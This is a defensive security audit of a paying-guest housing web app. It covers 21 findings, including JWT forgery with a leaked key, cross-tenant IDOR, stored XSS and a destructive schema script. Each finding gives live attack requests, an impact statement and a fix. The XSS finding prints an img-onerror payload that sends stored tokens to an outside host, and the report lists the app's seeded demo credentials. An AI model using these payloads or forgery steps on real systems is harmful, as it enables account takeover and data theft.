# Gate 5 — Defensive Review: PG Connect (`Kowshik-Borra/pg`)

**Auditor:** Chandra (Assurance Authority)
**Date:** 2026-11-11
**Target:** `/home/poorna/personal/pg-connect` @ `main` (2 commits)
**Runtime audited:** live instance on `http://127.0.0.1:5000`, MySQL 8.0.46 (`pgconnect-mysql`, host port 3307)
**Method:** source review + live black-box exploitation. Every finding below was executed against the running
app unless explicitly marked *code-only*.
**State hygiene:** database snapshotted to `/tmp/opencode/pgconnect-preAudit.sql` before mutation tests and
restored afterwards; verified post-restore (6 users, 0 bookings, 1 complaint, beds 2/3 `AVAILABLE`, admin login 200).

**Verdict: NOT production ready.** One credential-independent Super Admin takeover, four distinct
cross-tenant authorization breaks, stored XSS, and no token revocation.

---

## Severity summary

| ID | Title | Severity |
|---|---|---|
| AUDIT-001 | JWT signing key published in public repo → Super Admin forgery | **Critical** |
| AUDIT-002 | No object-level authorization on tenant routes (read + write) | **High** |
| AUDIT-003 | IDOR on report endpoints (invoice PDF, property Excel) | **High** |
| AUDIT-004 | Complaint routes not scoped to property ownership | **High** |
| AUDIT-005 | Stored XSS via complaint title / review comment into `innerHTML` | **High** |
| AUDIT-006 | Self-registration as `MANAGER` with no approval gate | **High** |
| AUDIT-007 | No token revocation on password change or suspension; no logout | **Medium** |
| AUDIT-008 | Unauthenticated state-mutating endpoint `/api/bookings/expire-reservations` | **Medium** |
| AUDIT-009 | Booking state machine corrupts when check-in omits `booking_id` | **Medium** |
| AUDIT-010 | Unverified properties publicly listed/readable with owner contact PII | **Medium** |
| AUDIT-011 | Demo credentials hardcoded in login UI + published in README | **Medium** |
| AUDIT-012 | `POST /api/tenants/visitors` always returns 500 (`NameError`) | **Medium** |
| AUDIT-013 | No login rate limiting or lockout | **Low** |
| AUDIT-014 | No security headers (CSP, X-Frame-Options, nosniff, HSTS) | **Low** |
| AUDIT-015 | Reservation expiry releases beds without verifying reservation ownership | **Low** |
| AUDIT-016 | Diagnostics leak internals (`DEBUG` error details, `/api/health`, `check_db.py`) | **Low** |
| AUDIT-017 | Privacy claim contradicted by code: `pan_number` / `aadhaar_last4` still writable | **Low** |
| AUDIT-018 | `GET /api/maps/nearby` loads all properties into memory | **Low** |
| AUDIT-019 | Manager dashboard hardcodes `property_id = 1` | **Medium** |
| AUDIT-020 | Seed thinner than the UI implies (empty bookings/visitors/photos) | **Low** |
| AUDIT-021 | `docs/pg_connect_schema.sql` drops all 26 tables and hardcodes `USE pg_connect_db` | **High** |

---

## AUDIT-001 — JWT signing key published in public repo → Super Admin forgery

**Severity:** Critical · **Component:** Authentication / secret management
**Affected files:** `.env:3-4`, `backend/.env:3-4`, `backend/app/config.py:44-45`, `.gitignore:10-13`

**Evidence**
```
$ git ls-files | grep env
.env
backend/.env
$ sed -n '3,4p' .env
JWT_SECRET_KEY=<redacted - rotate this, it is public>
SECRET_KEY=<redacted - rotate this, it is public>
```
A token minted with that published key and a `role: SUPER_ADMIN` claim was accepted by the live API:
```
$ python3 forge.py   # HS256, key = "<redacted - rotate this, it is public>", sub=1, role=SUPER_ADMIN
$ curl -s -o forged.json -w "%{http_code}" /api/admin/analytics -H "Authorization: Bearer $FORGED"
200
{"data":{"users":{"total":6,"owners":2,"tenants":2,"managers":1}}}
$ curl -s -o /dev/null -w "%{http_code}" /api/admin/audit-logs -H "Authorization: Bearer $FORGED"
200
```

**Impact** — Anyone with the public repo can mint a Super Admin token for any `sub` (user id) with no
credentials, no password, no account. Complete platform takeover: user suspension/activation, property
verification, platform-wide analytics and audit logs.

**Attack scenario** — 1) clone the public repo, 2) read `.env` for `JWT_SECRET_KEY`, 3) sign
`{sub:"1", role:"SUPER_ADMIN", type:"access"}` HS256, 4) call any `/api/admin/*` route.

**Recommendation** — Treat both keys as compromised. Remove `.env`/`backend/.env` from git tracking
(`git rm --cached`), rotate `SECRET_KEY` + `JWT_SECRET_KEY` in the live deployment, add `.env` to
`.gitignore`, and purge the values from history (BFG / `git filter-repo`) before the repo is used for
anything beyond a local demo. Load keys from the environment only; fail fast when absent.

**Verification** — `git ls-files | grep -c '^\.env'` → `0`; a token signed with any previously committed
key returns 401 on `/api/admin/analytics`; `.gitignore` contains `.env`.

**Status:** OPEN

---

## AUDIT-002 — No object-level authorization on tenant routes (read + write)

**Severity:** High · **Component:** Tenant management / RBAC
**Affected files:** `backend/app/routes/tenant_routes.py:16-49` (check-in), `:51-83` (check-out),
`:85-103` (tenant list), `:129-160` (visitor create), `:162-170` (visitor list) — none call
`verify_property_access`; `backend/app/services/tenant_service.py:12-130` receives no actor context.

**Evidence** — attacker account = a freshly self-registered `OWNER` with **zero properties**
(`GET /api/properties/owner/my-properties → 0`).
```
GET  /api/tenants/property/1            -> 200   (owner A's residents + PII)
GET  /api/tenants/visitors/property/1   -> 200
POST /api/tenants/check-in              -> 201   allocation id=3 on bed 2 of owner A's property
POST /api/tenants/allocations/1/check-out -> 200 owner A's paying resident evicted
        body: {"refund_amount":0,"deductions_amount":99999,"deduction_reason":"attacker stole deposit"}
```
PII returned in the tenant list object: `emergency_contact_name`, `emergency_contact_phone`,
`college_or_company_name`, plus the linked user record.

**Impact** — Any owner or manager (including a self-registered one, see AUDIT-006) can read every
property's resident roster and emergency contacts, occupy any bed, evict any tenant, and write arbitrary
deposit/refund figures into the financial ledger. This is a complete tenant-isolation failure.

**Attack scenario** — Register `role=OWNER` → `POST /api/tenants/check-in` with any `user_id` + `bed_id`
→ bed becomes `OCCUPIED`, deposit record and rent invoice are created for a property the attacker does
not own. Alternatively `POST /api/tenants/allocations/<id>/check-out` with a large
`deductions_amount` to fabricate a deposit forfeiture.

**Recommendation** — Resolve the target property inside the service (from `bed_id` / `allocation_id`)
and call `verify_property_access(property_id, actor, required_manager_perm=...)` before any mutation or
read. Add `can_manage_tenants` / `can_manage_finance` permission names to `ManagerAssignment` and
require them. Apply the same pattern already used correctly in `finance_routes.py:37,78,141`.

**Verification** — Repeat the four calls above as an unrelated owner: all must be `403`. Repeat as the
owning owner: unchanged behaviour. Add pytest coverage asserting `403` for a foreign property on each route.

**Status:** OPEN

---

## AUDIT-003 — IDOR on report endpoints (invoice PDF, property Excel)

**Severity:** High · **Component:** Reporting / document generation
**Affected files:** `backend/app/routes/report_routes.py:11-29`, `:31-41`

**Evidence** — same property-less attacker owner:
```
GET /api/reports/properties/1/excel   -> 200, 5160 bytes, "Microsoft Excel 2007+"
GET /api/reports/invoices/1/pdf       -> 200, 2625 bytes, "PDF document, version 1.4"
```
`download_invoice_pdf` only checks ownership when `role == "TENANT"`, so every other role bypasses it;
`download_property_excel` declares `role_required("OWNER","SUPER_ADMIN")` but never calls
`verify_property_access`.

**Impact** — Full financial statement of any property (invoices, payments, expenses) and any tenant's
invoice receipt (tenant name, phone, rent, deposit) downloadable by any owner.

**Attack scenario** — Loop `invoice_id` / `property_id` from 1 upward as any owner token; download the
whole platform's financial data.

**Recommendation** — For PDFs: allow `TENANT` only for their own invoice, otherwise
`verify_property_access(invoice.property_id, current_user)`. For Excel: call
`verify_property_access(property_id, current_user)` before generation.

**Verification** — Foreign invoice PDF and foreign property Excel both return `403`; owner's own
resources still return `200` with the same payload size.

**Status:** OPEN

---

## AUDIT-004 — Complaint routes not scoped to property ownership

**Severity:** High · **Component:** Complaints / maintenance
**Affected files:** `backend/app/routes/complaint_routes.py:102-110` (list), `:112-164` (status update)

**Evidence**
```
PATCH /api/complaints/1/status  (attacker owner, complaint belongs to property 1)
  -> 200  {"id":1,"status":"CLOSED"}
GET   /api/complaints/property/1 (attacker owner) -> 200, 1 ticket with title + tenant identity
```
No `verify_property_access` in either handler; `update_complaint_status` also accepts an arbitrary
`assigned_staff_id` with no validation that the staff belongs to the property.

**Impact** — Cross-owner read of all maintenance tickets (includes tenant identity and photo paths) and
unilateral closure/reassignment of another owner's tickets, plus notification spam to that owner's tenants.

**Attack scenario** — Enumerate `/api/complaints/property/<n>` as any owner; `PATCH` every ticket to
`CLOSED` with a note. SLA and maintenance data become untrustworthy.

**Recommendation** — Call `verify_property_access(complaint.property_id, current_user)` in both handlers;
validate `assigned_staff_id` against staff assigned to that property.

**Verification** — Foreign complaint list/update return `403`; owner's own property keeps working.

**Status:** OPEN

---

## AUDIT-005 — Stored XSS via complaint title / review comment into `innerHTML`

**Severity:** High · **Component:** Frontend rendering (all dashboards)
**Affected files:** `frontend/pages/manager-dashboard.html:250-263` (`${c.title}`, `${c.tenant_name}`),
`:276-282` (`${v.visitor_name}`), `frontend/pages/pg-details.html:407` (`${r.comment}`),
`frontend/pages/owner-dashboard.html:818,885,939`, `frontend/pages/admin-dashboard.html:243,286,326`,
`frontend/js/api.js:9-12` (tokens in `localStorage`).
No escaping helper exists anywhere (`grep -rn "escapeHtml|textContent|sanitize|DOMPurify" frontend/` → 0).

**Evidence** — payload submitted by a self-registered tenant and read back by a manager:
```
POST /api/complaints  (multipart, title = [XSS]<img src=x onerror="fetch(String.fromCharCode(...)+
     localStorage.getItem(String.fromCharCode(112,103,95,116,111,107,101,110)))">)
  -> 201
GET /api/complaints/property/1  (manager)
  -> 200, title returned verbatim: [XSS]<img src=x onerror="fetch(...localStorage.getItem('pg_token'))">
```
`manager-dashboard.html` injects `${c.title}` directly into `tbody.innerHTML`, and `api.js` stores the
access and refresh tokens in `localStorage`.

**Impact** — A tenant can execute JavaScript in the owner/manager/admin dashboard origin, exfiltrate
`localStorage` tokens, and act as that owner or admin (chained with AUDIT-002/003 gives full data access).
Because no logout/revocation exists (AUDIT-007), a stolen refresh token is valid for 30 days.

**Attack scenario** — Register as tenant → get an active stay → submit a complaint whose title is an
`<img onerror>` payload → owner opens Complaints module → token is POSTed to the attacker's server.

**Recommendation** — Escape all interpolated values (single `escapeHtml()` helper applied to every
`${}` in template literals, or build DOM nodes with `textContent`). Treat server data as untrusted even
when it came from "your own" API. Move tokens out of `localStorage` or add a strict CSP (AUDIT-014) as
defence in depth. Do not rely on input filtering — the API correctly stores free text.

**Verification** — Re-submit the payload; the dashboard must render it as literal text and no request is
made to `evil.example`. Add a lint rule or review checklist item banning raw `${...}` inside `innerHTML`.

**Status:** OPEN

---

## AUDIT-006 — Self-registration as `MANAGER` with no approval gate

**Severity:** High · **Component:** Registration / RBAC
**Affected files:** `backend/app/routes/auth_routes.py:22-28` (role accepted from request body),
`backend/app/middleware/rbac.py:7-31` (role taken from JWT claims only)

**Evidence**
```
POST /api/auth/register {"role":"MANAGER", ...} -> 201, user.is_verified = false, tokens issued
GET  /api/tenants/property/1  (that brand-new manager) -> 200
GET  /api/complaints/property/1 -> 200
```
`is_verified` is never enforced on any route (`grep -rn "is_verified" backend/app` → only counts and
property filters), and a `ManagerAssignment` row is only required by `verify_property_access`, which the
vulnerable routes never call.

**Impact** — Turns AUDIT-002/003/004 from "any owner" into "any anonymous internet user": register, then
read every property's residents and complaints. No admin action required.

**Attack scenario** — One unauthenticated POST to `/api/auth/register` with `role=MANAGER`, then enumerate
`/api/tenants/property/{1..n}`.

**Recommendation** — Self-registration must only ever create `TENANT` and `OWNER` (owner pending admin
approval). `MANAGER` accounts must be created by an owner/admin and be bound to a `ManagerAssignment`.
Enforce `is_verified` / `is_approved` in the auth layer, not only in the UI. Note that `OWNER` already
requires manual approval only for property verification, not for API access.

**Verification** — `POST /api/auth/register` with `role=MANAGER` → `400`; register-then-read returns `403`.

**Status:** OPEN

---

## AUDIT-007 — No token revocation on password change or suspension; no logout

**Severity:** Medium · **Component:** Session lifecycle
**Affected files:** `backend/app/routes/user_routes.py:52-70`, `backend/app/routes/auth_routes.py:149-165`,
`backend/app/middleware/rbac.py:14-29`, `backend/app/__init__.py:61-82` (no `token_in_blocklist_loader`)

**Evidence**
```
PATCH /api/admin/users/6/status {"is_active": false}   -> 200
GET   /api/tenants/property/1  (suspended user's old access token) -> 200
GET   /api/complaints/property/1 (same token)                       -> 200
POST  /api/users/change-password -> 200
POST  /api/auth/refresh (refresh token issued BEFORE the password change) -> 200
GET   /api/auth/me (access token issued before the change)                -> 200
```
Login is correctly blocked while suspended (`403`) and `/refresh` does re-check `is_active` (`401`), but
access tokens carry `role` and are trusted for their full 60-minute lifetime, and the refresh token is not
rotated or invalidated for 30 days. There is no `/logout` route at all.

**Impact** — Suspension takes up to 60 minutes to bite, and a stolen refresh token survives a password
reset for 30 days. Role changes (demotion) are also ignored until the token expires.

**Attack scenario** — Steal a refresh token via AUDIT-005, wait for the victim to change their password,
keep minting access tokens for 30 days. Or: a suspended owner continues cross-tenant reads for an hour.

**Recommendation** — Add a `jti` blocklist (Redis/table) with `@jwt.token_in_blocklist_loader`, bump a
per-user `token_version` claim checked on every request, revoke all refresh tokens on password change and
on suspend, rotate refresh tokens on use, and implement `POST /api/auth/logout`.

**Verification** — After change-password: old refresh → `401`, old access → `401`. After suspend: any
request with the pre-suspend token → `401`.

**Status:** OPEN

---

## AUDIT-008 — Unauthenticated state-mutating endpoint `/api/bookings/expire-reservations`

**Severity:** Medium · **Component:** Booking maintenance
**Affected files:** `backend/app/routes/booking_routes.py:146-157`, `backend/app/services/booking_service.py:215-255`

**Evidence**
```
POST /api/bookings/expire-reservations   (no Authorization header) -> 200
{"data":{"expired_count":0}}
```
The handler has neither `@jwt_required()` nor `@role_required`.

**Impact** — Any anonymous caller can drive a full-table expiry scan on demand. The scan loads all
`APPROVED` bookings and mutates beds with no row locks, so repeated calls can be used to contend with
legitimate approve/check-in traffic, and the response leaks how many reservations expired.

**Attack scenario** — Loop the endpoint; watch `expired_count` to learn booking volume, and race the job
against approval traffic.

**Recommendation** — Require `SUPER_ADMIN` (or an internal scheduler token + IP allowlist), move the
sweep to a cron/worker, and select bookings with `FOR UPDATE`. Return `expired_count` only to admins.

**Verification** — Unauthenticated call → `401`; admin call → `200`; cron path still works.

**Status:** OPEN

---

## AUDIT-009 — Booking state machine corrupts when check-in omits `booking_id`

**Severity:** Medium · **Component:** Booking/check-in lifecycle
**Affected files:** `backend/app/services/tenant_service.py:33-59` (lookup), `:88-99` (completion is
conditional on the *request* carrying `booking_id`), `backend/app/routes/tenant_routes.py:23-25`

**Evidence**
```
POST /api/bookings/1/approve (owner)                     -> 200, booking status APPROVED, bed 3 RESERVED
POST /api/tenants/check-in {"user_id":9,"bed_id":3}      -> 201   (no booking_id in body)
  bookings: id=1 status=APPROVED   beds: id=3 status=OCCUPIED
POST /api/bookings/expire-reservations                   -> {"expired_count":1}
  bookings: id=1 status=EXPIRED    beds: id=3 status=OCCUPIED  (tenant still resident)
```
`tenant_service.py:51` even *finds* the matching approved booking when the bed is `RESERVED`, but only
`booking_id` passed by the client sets `COMPLETED` at `:88`, so the discovered booking is never closed.

**Impact** — Booking history and status become wrong the moment check-in omits the optional
`booking_id`: an occupied tenancy is recorded as `EXPIRED`, the history row claims "reservation window
elapsed without check-in", and any reconciliation/report built on booking status is false. A second
approval for the same booking is permanently impossible.

**Attack scenario** — Not even malicious: a manager using the check-in dialog without the booking
reference corrupts the ledger for that resident.

**Recommendation** — Derive the booking from the bed inside `check_in_tenant` (the lookup at `:49-59`
already exists) and always transition the matched `APPROVED` booking to `COMPLETED` with a history row.
Make `booking_id` server-derived rather than client-supplied, and reject check-in on a `RESERVED` bed if
no approved booking exists (already done).

**Verification** — Repeat the flow without `booking_id`: booking status must be `COMPLETED`, and a
subsequent expiry sweep must return `0` and leave the booking untouched.

**Status:** OPEN

---

## AUDIT-010 — Unverified properties publicly listed/readable with owner contact PII

**Severity:** Medium · **Component:** Property discovery
**Affected files:** `backend/app/routes/property_routes.py:45-48` (search filters only `is_active`),
`:102-110` (detail by id filters only `is_active`), versus `backend/app/routes/map_routes.py:22,53`
(correctly filters `is_verified`)

**Evidence**
```
POST /api/properties (owner) -> 201 {"id":3,"is_verified":false,"is_active":true}
GET  /api/properties/3 (unauthenticated)
  -> 200 {"name":"Hidden Pending PG","is_verified":false,
          "contact_email":"owner.rajesh@pgconnect.com","contact_phone":"+919811223344"}
GET  /api/properties/search?city=Bengaluru&per_page=50
  -> FOUND unverified listing id=3
```
The README (§2.3) and the map endpoints promise "active **and admin-verified**" visibility only.

**Impact** — Listings an admin has not verified — potentially fraudulent or incomplete — are publicly
discoverable and indexable, including the owner's personal contact details. Contradicts the platform's
core trust promise and the stated business rule.

**Attack scenario** — Register as owner, publish a fake PG with real-looking address and phone, appear in
public search immediately without verification, harvest enquiries.

**Recommendation** — Apply `is_verified == True` to public search and to detail-by-id. Keep an
owner-scoped endpoint for unverified preview. Also mask contact details for non-verified listings.

**Verification** — Newly created property must be absent from `/api/properties/search` and return `404`
(or a minimal preview) on the public detail route until an admin approves it.

**Status:** OPEN

---

## AUDIT-011 — Demo credentials hardcoded in login UI + published in README

**Severity:** Medium · **Component:** Frontend / deployment hygiene
**Affected files:** `frontend/pages/login.html:51,54,60`, `README.md` §3

**Evidence**
```
frontend/pages/login.html:51  onclick="fillCreds('admin@pgconnect.com', 'Admin@12345')"
frontend/pages/login.html:54  onclick="fillCreds('owner.rajesh@pgconnect.com', 'Owner@12345')"
frontend/pages/login.html:60  onclick="fillCreds('tenant.rahul@gmail.com', 'Tenant@12345')"
```

**Impact** — If this build is ever served beyond localhost, the Super Admin account is one click away for
every visitor, and `seed.py` re-establishes these accounts idempotently.

**Attack scenario** — Open `/pages/login.html`, click "Super Admin", logged in.

**Recommendation** — Gate the quick-fill block behind a build flag or remove it. Make `seed.py` refuse to
run unless `FLASK_ENV=development` and refuse to create the admin with a default password in any other
environment. Require a password change on first login for seeded accounts.

**Verification** — Production build contains no credentials; `seed.py` exits non-zero when
`FLASK_ENV=production`.

**Status:** OPEN

---

## AUDIT-012 — `POST /api/tenants/visitors` always returns 500 (`NameError`)

**Severity:** Medium · **Component:** Visitor log (functional defect)
**Affected files:** `backend/app/routes/tenant_routes.py:1` vs `:143`

**Evidence**
```
:1   from datetime import date, time
:143 now = datetime.now()
POST /api/tenants/visitors (valid body, valid token) -> 500
{"error":{"code":"INTERNAL_SERVER_ERROR","message":"An internal server error occurred."}}
```
`datetime` is never imported in that module.

**Impact** — The visitor security log — a flagship manager feature — is 100% broken. No test covers it
(the suite has 21 passing tests, none touching `/tenants/visitors`).

**Recommendation** — Import `datetime` (or `from datetime import datetime`); add a pytest covering
visitor create + list with the `403` foreign-property case from AUDIT-002.

**Verification** — Endpoint returns `201` with a persisted row; new test fails before the fix and passes after.

**Status:** OPEN

---

## AUDIT-013 — No login rate limiting or lockout

**Severity:** Low · **Component:** Authentication abuse resistance
**Affected files:** `backend/app/routes/auth_routes.py:92-128`

**Evidence** — 15 consecutive wrong-password attempts on `admin@pgconnect.com` all executed:
`401 401 401 401 401 401 401 401 401 401 401 401 401 401 401` (no delay, no lockout, no CAPTCHA).
`bcrypt` cost 12 slows each attempt but does not stop distributed guessing.

**Recommendation** — Per-IP + per-account throttling (Flask-Limiter or an edge rule), exponential
backoff, and an audit-log alert on repeated failures. Keep the generic error message (already correct).

**Verification** — Attempt 6 within a window returns `429`; legitimate retry after the window succeeds.

**Status:** OPEN

---

## AUDIT-014 — No security headers

**Severity:** Low · **Component:** HTTP hardening
**Affected files:** `backend/app/__init__.py` (no `after_request`)

**Evidence**
```
$ curl -sI http://127.0.0.1:5000/
Server: Werkzeug/3.1.9 Python/3.12.3
(none of: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security)
```

**Impact** — No clickjacking protection, no MIME-sniffing protection, and no CSP to blunt AUDIT-005.

**Recommendation** — Add an `after_request` hook (or flask-talisman) setting `Content-Security-Policy`
(no `unsafe-inline` once template literals are fixed), `X-Content-Type-Options: nosniff`,
`X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, and HSTS at the edge.

**Verification** — `curl -sI` shows all five headers.

**Status:** OPEN

---

## AUDIT-015 — Reservation expiry releases beds without verifying reservation ownership

**Severity:** Low · **Component:** Booking concurrency
**Affected files:** `backend/app/services/booking_service.py:230-241`

**Evidence** — *code-only*: the release condition is `if bed and bed.status == "RESERVED"`; the
`bed.notes` field already contains `Reserved for booking {ref}`, but the reference is never compared, and
no `SELECT ... FOR UPDATE` is taken, unlike `approve_booking_request` (`:95`) and `check_in_tenant`
(`tenant_service.py:14`).

**Impact** — If a bed is re-reserved for a different booking between the stale-booking read and the
release (or concurrently with a check-in), the sweep can flip a bed to `AVAILABLE` that belongs to
another reservation. Low probability today (single-process dev), non-zero under concurrent approve/
check-in traffic once the app is behind a real WSGI server.

**Recommendation** — Compare `bed.notes`/add a `reserved_for_booking_id` column, lock rows with
`with_for_update()` inside a single transaction, and batch by `LIMIT`.

**Verification** — Add a concurrency test that approves booking B on a bed while expiring booking A; the
bed must end as `RESERVED` for B.

**Status:** OPEN

---

## AUDIT-016 — Diagnostics leak internals

**Severity:** Low · **Component:** Error handling / diagnostics
**Affected files:** `backend/app/middleware/error_handlers.py:38,51,64,91` (raw exception text when
`DEBUG`), `backend/app/__init__.py:42-54` (`/api/health` returns `unreachable: <exception>` to anonymous
callers), `backend/app/check_db.py:23` (`os.getenv("MYSQL_PASSWORD", "password")` fallback)

**Evidence** — health endpoint is unauthenticated; error payloads include `str(err)`/`str(err.orig)`
under the development config that ships in `.env` (`FLASK_ENV=development`).

**Impact** — Internal SQL text, host/user names and driver errors reach unauthenticated callers; the
diagnostic script silently tries a default password.

**Recommendation** — Never include exception text in API responses (log it instead); make `/api/health`
report only `ok`/`degraded`; remove credential defaults from `check_db.py` and fail loudly.

**Verification** — Force a DB error with `FLASK_ENV=production`; response contains no driver text.

**Status:** OPEN

---

## AUDIT-017 — Privacy claim contradicted by code

**Severity:** Low · **Component:** Registration/profile privacy (documentation vs implementation)
**Affected files:** `backend/app/models/user.py:55-56`, `backend/app/routes/user_routes.py:28-31`,
README §2.4

**Evidence**
```
user.py:55   pan_number = db.Column(db.String(20), nullable=True)
user.py:56   aadhaar_last4 = db.Column(db.String(4), nullable=True)
user_routes.py:29  current_user.owner_profile.pan_number = data["pan_number"].strip()
user_routes.py:31  current_user.owner_profile.aadhaar_last4 = data["aadhaar_last4"].strip()
```
README: "Government identity numbers (Aadhaar number, PAN card...) have been removed... Backend routes
and schemas no longer accept or require these fields."

**Impact** — A privacy statement that the code contradicts. Owners can still submit (and the DB still
stores) partial Aadhaar and PAN, which is exactly what the policy says is not collected.

**Recommendation** — Either drop the columns and the profile-update branches in a migration, or correct
the README and add explicit consent. Do not keep both.

**Verification** — `PUT /api/users/profile {"pan_number":"ABCDE1234F"}` must be rejected/ignored, and
grep for the columns returns only migration history.

**Status:** OPEN

---

## AUDIT-018 — `GET /api/maps/nearby` loads all properties into memory

**Severity:** Low · **Component:** Map performance
**Affected files:** `backend/app/routes/map_routes.py:12-44`

**Evidence** — `PGProperty.query.filter_by(is_active=True, is_verified=True).all()` then a Python loop
computing haversine distance per row; no bound on rows, on `radius_km` (a caller can pass `1e9`), or on
result size.

**Impact** — O(n) memory and CPU per request, unbounded radius — a cheap DoS and a scalability wall once
the listing count grows.

**Recommendation** — Bounding-box prefilter in SQL (`BETWEEN` on lat/lng), cap `radius_km`, `LIMIT` the
result, and note that a spatial index (MySQL `POINT`/`ST_Distance_Sphere`) is the real fix.

**Verification** — Load-test with 10k synthetic properties; response time stays sub-linear.

**Status:** OPEN

---

## AUDIT-019 — Manager dashboard hardcodes `property_id = 1`

**Severity:** Medium (functional, and the likely cause of the "cannot retrieve data" report)
**Affected files:** `frontend/pages/manager-dashboard.html:244, 269, 274`

**Evidence**
```
:244  const res  = await API.get("/complaints/property/1");
:269  const tRes = await API.get("/tenants/property/1");
:274  const vRes = await API.get("/tenants/visitors/property/1");
```
There is no property selector anywhere in the manager dashboard.

**Impact** — For any manager whose `ManagerAssignment` is not property 1, the Complaints table, the active-resident
count and the visitor log all render empty while the queries themselves succeed (`200` with data). The backend is
correct; the UI asks the wrong question. Looks exactly like "the database returns nothing".

**Recommendation** — Resolve the manager's property list from `/api/maps/owner-properties`-equivalent (or a new
`/api/managers/my-properties`) and route all three calls through the selected property id. Never embed ids in
dashboard source.

**Verification** — Assign a manager to property 2 only; dashboard must show property 2's complaints/residents.

**Status:** OPEN

---

## AUDIT-020 — Seed data is thinner than the UI implies (empty tables by design)

**Severity:** Low (expectation management, not a defect)
**Affected files:** `backend/seed.py` (no `Booking` / `BookingHistory` / `VisitorLog` / `PropertyPhoto` inserts)

**Evidence** — exact counts after a clean seed on a scratch DB built from `docs/pg_connect_schema.sql`:
`bookings 0`, `booking_history 0`, `visitor_logs 0`, `property_photos 0`, `payments 1`, `reviews 1`,
`complaints 1`, `wishlists 1`, `property_verifications 0`.

**Impact** — Owner "Bookings", manager "Visitors", and public property galleries are legitimately empty after
setup; this is routinely read as a retrieval failure. `seed.py` allocates residents directly, never through the
booking workflow, so the booking list can never be non-empty from a seed.

**Recommendation** — Seed 2-3 bookings across `PENDING`/`APPROVED`/`COMPLETED`, one visitor log, one property
photo, and a few payments so every dashboard module has representative data; document the empty-by-design tables.

**Verification** — Every dashboard tab renders at least one row after `seed.py` on a clean DB.

**Status:** OPEN

---

## AUDIT-021 — `docs/pg_connect_schema.sql` is destructive and database-name agnostic

**Severity:** **High** (silent total data loss on a routine setup step)
**Affected files:** `docs/pg_connect_schema.sql:7-12` (and the 26 `DROP TABLE IF EXISTS` statements that follow),
`README.md` §4 Step 4 (instructs the operator to run this file)

**Evidence**
```sql
-- docs/pg_connect_schema.sql
CREATE DATABASE IF NOT EXISTS `pg_connect_db` ...;
USE `pg_connect_db`;          -- line 8: hardcoded, ignores any target database
SET FOREIGN_KEY_CHECKS = 0;
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (...);   -- x26: every table is dropped before being created
```
Reproduced accidentally during this audit: piping that file into a *different* database
(`mysql ... pgc_schema_test < docs/pg_connect_schema.sql`) did not touch `pgc_schema_test` at all —
the embedded `USE pg_connect_db` redirected it, so the script **dropped and recreated all 26 tables of the
live database**. Confirmed from the MySQL binary log (`binlog.000002`): 26 `DROP TABLE IF EXISTS` events
followed by `CREATE TABLE` events, with no `DELETE`/`TRUNCATE` anywhere — the data was lost by schema
replacement, not by row deletion.

**Impact** — Anyone who re-runs README Step 4 against an existing installation (very common when a migration
appears broken, or when re-provisioning a second environment) destroys all production/development data with
no warning and a `0` exit code. This is a plausible root cause of the reported "the database has no data"
symptom: the tables still exist, so the app connects and answers `200` — it simply has nothing to return.

**Attack scenario** — Not attacker-driven; an operator mistake induced by the tooling. Run
`mysql -u root -p pg_another_db < docs/pg_connect_schema.sql` expecting an isolated environment and watch the
main database empty itself.

**Recommendation** — Remove the `CREATE DATABASE` / `USE` lines from the file (the client's database selection
must stay authoritative), move the `DROP TABLE` block behind an opt-in `--reset` flag or a separate
`docs/pg_connect_reset.sql`, and prefix the file with a warning header. Better: make Alembic the only
schema authority and delete the raw DDL, since `001_initial_schema` already reproduces the same schema
(verified: 0 column/type differences — see `docs/kowshik-dev/02-database-verification.md` §6).

**Verification** — `mysql -u root -p some_other_db < docs/pg_connect_schema.sql` must create tables in
`some_other_db` and leave `pg_connect_db` byte-for-byte unchanged (`CHECKSUM TABLE` or a row-count snapshot
before/after).

**Status:** OPEN

---

## EVIDENCE AUDIT

| Claim | Evidence | Verdict |
|---|---|---|
| The JWT secret in the public repo yields Super Admin | Forged HS256 token → `200` on `/api/admin/analytics` and `/api/admin/audit-logs`; `{"total":6,...}` returned | VERIFIED |
| Tenant routes lack object-level authorization | Owner with 0 properties → `200` on `/tenants/property/1`, `201` on foreign check-in, `200` on foreign check-out | VERIFIED |
| Report endpoints are IDOR | Foreign Excel `200/5160 bytes`, foreign PDF `200/2625 bytes`, both valid files | VERIFIED |
| Complaint routes are unscoped | Foreign complaint `PATCH → 200 status=CLOSED`; foreign list `200` | VERIFIED |
| Stored XSS reaches a dashboard sink | Payload stored `201` and returned verbatim; `${c.title}` interpolated into `innerHTML`; tokens in `localStorage`; no escaping helper | VERIFIED |
| Self-registration as MANAGER grants cross-property reads | `201` registration, `is_verified=false`, then `200` on `/tenants/property/1` | VERIFIED |
| Password change / suspension does not revoke sessions | Suspended token `200`; pre-change refresh `200`; pre-change access `200` | VERIFIED |
| `/api/bookings/expire-reservations` is unauthenticated | No-token `POST → 200` | VERIFIED |
| Check-in without `booking_id` corrupts booking state | APPROVED → check-in `201` → booking still APPROVED → sweep → EXPIRED with bed OCCUPIED | VERIFIED |
| Unverified properties are publicly visible | Unauthenticated `GET /api/properties/3 → 200` with contact PII; present in public search | VERIFIED |
| Demo credentials are shipped in the UI | `login.html:51,54,60` `fillCreds('admin@pgconnect.com','Admin@12345')` | VERIFIED |
| Visitor log endpoint is broken | Valid request → `500 INTERNAL_SERVER_ERROR`; `datetime` not imported | VERIFIED |
| No login rate limiting | 15 rapid failures, all `401`, no lockout | VERIFIED |
| No security headers | `curl -sI /` → only `Server:` | VERIFIED |
| SQL injection is not exploitable | Every query is ORM/parameterized; only `db.text("SELECT 1")` exists in `__init__.py` | VERIFIED (clean) |
| Approval path is cross-owner safe | Attacker owner approving owner A's booking → `403` | VERIFIED (clean) |
| Password hashing is sound | bcrypt, `gensalt(rounds=12)`, `checkpw` (`models/user.py:27-34`) | VERIFIED (clean) |
| Test suite isolates from real data | `TestingConfig` in-memory SQLite + runtime guard in `conftest.py:13-19`; `21 passed` | VERIFIED (clean) |
| **MySQL connection + retrieval work end-to-end** | 30 GET endpoints across all four roles → all `200`; ORM counts non-zero (users 6, properties 2, rooms 5, beds 9, invoices 2, allocations 2, food_menus 28); `alembic_version = 002_privacy_nullable_identity`; aggregates (`ONLY_FULL_GROUP_BY` active) and `DECIMAL` serialization both correct | **VERIFIED (clean)** |
